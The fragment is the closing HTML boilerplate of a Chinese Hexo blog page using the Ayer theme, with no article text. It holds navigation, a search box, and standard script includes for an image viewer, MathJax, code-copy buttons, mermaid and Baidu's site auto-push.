      <a class="nav-item-link" href="/">主页</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/archives">归档</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/categories">分类</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/tags">标签</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/friends">友链</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/about">关于</a>
    </li>
    
  </ul>
</nav>
<nav class="navbar navbar-bottom">
  <ul class="nav">
    <li class="nav-item">
      
      <a class="nav-item-link nav-item-search"  title="搜索">
        <i class="ri-search-line"></i>
      </a>
      
      
      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
        <i class="ri-rss-line"></i>
      </a>
      
    </li>
  </ul>
</nav>
<div class="search-form-wrap">
  <div class="local-search local-search-plugin">
  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
  <div id="local-search-result" class="local-search-result"></div>
</div>
</div>
    </aside>
    <script>
      if (window.matchMedia("(max-width: 768px)").matches) {
        document.querySelector('.content').classList.remove('on');
        document.querySelector('.sidebar').classList.remove('on');
      }
    </script>
    <div id="mask"></div>

<!-- #reward -->
<div id="reward">
  <span class="close"><i class="ri-close-line"></i></span>
  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
  <div class="reward-box">
    
    
  </div>
</div>
    
<script src="/js/jquery-2.0.3.min.js"></script>


<script src="/js/lazyload.min.js"></script>

<!-- Tocbot -->


<script src="/js/tocbot.min.js"></script>

<script>
  tocbot.init({
    tocSelector: '.tocbot',
    contentSelector: '.article-entry',
    headingSelector: 'h1, h2, h3, h4, h5, h6',
    hasInnerContainers: true,
    scrollSmooth: true,
    scrollContainer: 'main',
    positionFixedSelector: '.tocbot',
    positionFixedClass: 'is-position-fixed',
    fixedSidebarOffset: 'auto'
  });
</script>

<script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css">
<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js"></script>

<script src="/dist/main.js"></script>

<!-- ImageViewer -->

<!-- Root element of PhotoSwipe. Must have class pswp. -->
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    <!-- Background of PhotoSwipe. 
         It's a separate element as animating opacity is faster than rgba(). -->
    <div class="pswp__bg"></div>

    <!-- Slides wrapper with overflow:hidden. -->
    <div class="pswp__scroll-wrap">

        <!-- Container that holds slides. 
            PhotoSwipe keeps only 3 of them in the DOM to save memory.
            Don't modify these 3 pswp__item elements, data is added later on. -->
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                <!--  Controls are self-explanatory. Order can be changed. -->

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
                <!-- element will get class pswp__preloader--active when preloader is running -->
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div>

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css">
<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"></script>

<script>
    function viewer_init() {
        let pswpElement = document.querySelectorAll('.pswp')[0];
        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))

        $imgArr.forEach(($em, i) => {
            $em.onclick = () => {
                // slider展开状态
                // todo: 这样不好，后面改成状态
                if (document.querySelector('.left-col.show')) return
                let items = []
                $imgArr.forEach(($em2, i2) => {
                    let img = $em2.getAttribute('data-idx', i2)
                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
                    let title = $em2.getAttribute('alt')
                    // 获得原图尺寸
                    const image = new Image()
                    image.src = src
                    items.push({
                        src: src,
                        w: image.width || $em2.width,
                        h: image.height || $em2.height,
                        title: title
                    })
                })
                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
                    index: parseInt(i)
                });
                gallery.init()
            }
        })
    }
    viewer_init()
</script>

<!-- MathJax -->

<script type="text/x-mathjax-config">
  MathJax.Hub.Config({
      tex2jax: {
          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
          processEscapes: true,
          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
      }
  });

  MathJax.Hub.Queue(function() {
      var all = MathJax.Hub.getAllJax(), i;
      for(i=0; i < all.length; i += 1) {
          all[i].SourceElement().parentNode.className += ' has-jax';
      }
  });
</script>

<script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.6/unpacked/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
<script>
  var ayerConfig = {
    mathjax: true
  }
</script>

<!-- Katex -->

<!-- busuanzi  -->


<script src="/js/busuanzi-2.3.pure.min.js"></script>


<!-- ClickLove -->

<!-- ClickBoom1 -->

<!-- ClickBoom2 -->


<script src="/js/clickBoom2.js"></script>


<!-- CodeCopy -->


<link rel="stylesheet" href="/css/clipboard.css">

<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
<script>
  function wait(callback, seconds) {
    var timelag = null;
    timelag = window.setTimeout(callback, seconds);
  }
  !function (e, t, a) {
    var initCopyCode = function(){
      var copyHtml = '';
      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
      copyHtml += '</button>';
      $(".highlight .code pre").before(copyHtml);
      $(".article pre code").before(copyHtml);
      var clipboard = new ClipboardJS('.btn-copy', {
        target: function(trigger) {
          return trigger.nextElementSibling;
        }
      });
      clipboard.on('success', function(e) {
        let $btn = $(e.trigger);
        $btn.addClass('copied');
        let $icon = $($btn.find('i'));
        $icon.removeClass('ri-file-copy-2-line');
        $icon.addClass('ri-checkbox-circle-line');
        let $span = $($btn.find('span'));
        $span[0].innerText = 'COPIED';
        
        wait(function () { // 等待两秒钟后恢复
          $icon.removeClass('ri-checkbox-circle-line');
          $icon.addClass('ri-file-copy-2-line');
          $span[0].innerText = 'COPY';
        }, 2000);
      });
      clipboard.on('error', function(e) {
        e.clearSelection();
        let $btn = $(e.trigger);
        $btn.addClass('copy-failed');
        let $icon = $($btn.find('i'));
        $icon.removeClass('ri-file-copy-2-line');
        $icon.addClass('ri-time-line');
        let $span = $($btn.find('span'));
        $span[0].innerText = 'COPY FAILED';
        
        wait(function () { // 等待两秒钟后恢复
          $icon.removeClass('ri-time-line');
          $icon.addClass('ri-file-copy-2-line');
          $span[0].innerText = 'COPY';
        }, 2000);
      });
    }
    initCopyCode();
  }(window, document);
</script>


<!-- CanvasBackground -->


<script src="/js/dz.js"></script>


<!-- mermaid -->

  <script src='https://cdn.bootcdn.net/ajax/libs/mermaid/8.5.2/mermaid.min.js'></script>
  <script>
    if (window.mermaid) {
      mermaid.initialize({theme: 'forest'});
    }
  </script>

<!-- baiduSpider auto push -->

  <script>
    (function(){
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https'){
       bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
      }
      else{
      bp.src = 'http://push.zhanzhang.baidu.com/push.js';
      }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
    </script>


    
  </div>
</body>

</html>